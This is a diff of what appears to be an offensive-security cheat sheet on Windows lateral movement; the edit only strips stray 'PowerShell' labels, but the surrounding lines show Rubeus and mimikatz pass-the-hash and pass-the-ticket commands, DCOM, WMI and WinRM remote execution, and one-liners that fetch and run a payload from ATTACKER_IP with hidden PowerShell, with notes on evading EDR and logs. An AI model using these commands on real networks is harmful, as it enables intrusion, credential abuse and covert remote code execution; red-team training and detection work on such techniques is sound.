@@ -11,7 +11,6 @@
 
 _Using AES-256 keys instead of NTLM hashes is significantly safer for OPSEC and avoids leaving highly suspicious NTLM authentication logs (Event ID 4624 Logon Type 3)._
 
-PowerShell
 
 ```powershell
 # Request a TGT using an AES-256 key and inject it directly into memory via Rubeus (Stealth PTT)
@@ -27,7 +26,6 @@ sekurlsa::pth /user:Administrator /domain:domain.local /aes256:AES_KEY_HERE /run
 
 _Unlike WMI or PsExec, the Distributed Component Object Model (DCOM) does not create new services. It executes payloads through legitimate Windows applications, making it highly evasive against standard EDRs._
 
-PowerShell
 
 ```powershell
 # Remote code execution via MMC20.Application COM object
@@ -45,7 +43,6 @@ $com.Windows().Item().Document.Application.ShellExecute("cmd.exe", "/c powershel
 
 _Utilizing legitimate WMI queries instead of dropping PsExec binaries. Operates over RPC (Port 135)._
 
-PowerShell
 
 ```powershell
 # Create a remote process using native PowerShell cmdlets (Fileless payload delivery)
@@ -61,7 +58,6 @@ wmic /node:TARGET process call create "powershell.exe -nop -w hidden -c iex(iwr 
 
 _An excellent lateral movement channel for environments where SMB (Port 445) is restricted. All traffic is AES encrypted, even over standard HTTP (5985)._
 
-PowerShell
 
 ```powershell
 # Native WinRS (Windows Remote Shell) - Useful if PowerShell is heavily restricted/monitored
@@ -80,7 +76,6 @@ Invoke-Command -ComputerName TARGET -ScriptBlock { iex(iwr http://ATTACKER_IP/pa
 
 _Injecting a stolen Kerberos ticket (TGT/TGS) into the current session. The cleanest method of authentication._
 
-PowerShell
 
 ```powershell
 # Inject a base64 encoded ticket into memory via Rubeus
